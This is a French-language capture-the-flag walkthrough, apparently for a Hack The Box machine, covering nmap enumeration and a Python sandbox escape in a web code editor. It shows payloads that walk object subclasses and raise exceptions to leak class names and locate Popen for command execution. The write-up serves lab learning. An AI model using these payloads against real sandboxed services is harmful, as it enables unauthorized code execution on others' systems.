## Enumération

- **IP**
```
10.10.11.62
```

- **Nmap**
```
nmap -sC -sV -A 10.10.11.62
```

![[nmap.png]]On trouve deux port ouverts dont le port **5000** avec le service **http**. On va donc essayer d'accéder au site web via : `http://10.10.11.62:5000`

![[code-htb.png]]

On a donc un éditeur de code python. L'application web ne laisse pas faire `import` ou `eval` mais on sait qu'une **application fait echo aux éxceptions**. On peut donc faire sortir une erreur  pour savoir un peu ce qui se passe en dessous:

```
print((()).__class__.__bases__[0].__subclasses__())
```

![[Capture du 2025-06-10 20-26-28.png]]

l a craché un buffet entier de classes. Plus de 400 sous-classes. Quelque part là dedans , on doit chercher le `Popen`. Pourquoi? Parce que Popen vit dans le module de sous-processus, et c'est comme ça qu'on posera les commandes Shell.

Ici, on n'a pas la fonction `.index()` donc on peut faire une recherche. On va donc essayer de détourner la logique du programme jusqu'à une réussite avec des **obfuscations Python

```
raise Exception((()).__class__.__bases__[0].__subclasses__()[100].__name__)
```
!! Echec !!

```
raise Exception((()).__class__.__bases__[0].__subclasses__()[200].__name__)
```
!! Echec !!

```
raise Exception((()).__class__.__bases__[0].__subclasses__()[317].__name__)
```
!! **C'est là que se trouve le Popen** !!

![[popen.png]]
